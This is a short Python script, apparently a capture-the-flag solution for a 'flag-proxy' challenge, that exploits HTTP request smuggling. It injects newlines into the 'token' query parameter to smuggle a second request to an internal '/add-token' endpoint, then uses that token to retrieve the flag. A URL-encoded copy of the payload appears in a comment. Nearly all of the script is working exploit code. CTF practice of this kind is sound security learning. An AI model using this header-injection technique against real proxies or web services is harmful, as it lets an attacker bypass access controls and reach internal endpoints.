import requests

# http://flag-proxy.challs.teamitaly.eu/flag?token=SMUGGLE%0AContent-Length:+0%0AConnection:+keep-alive%0A%0AGET+/flag+HTTP/1.0

url = "http://flag-proxy.challs.teamitaly.eu/flag"
token = "httpsmugglingiscool"
smuggle = f"SMUGGLE\nContent-Length: 0\nConnection: keep-alive\n\nGET /add-token?token={token} HTTP/1.0"

req1 = requests.get(url, params={"token": smuggle})
#print(req1.text)

req2 = requests.get(url, params={'token': token})
print(req2.json()['body'])
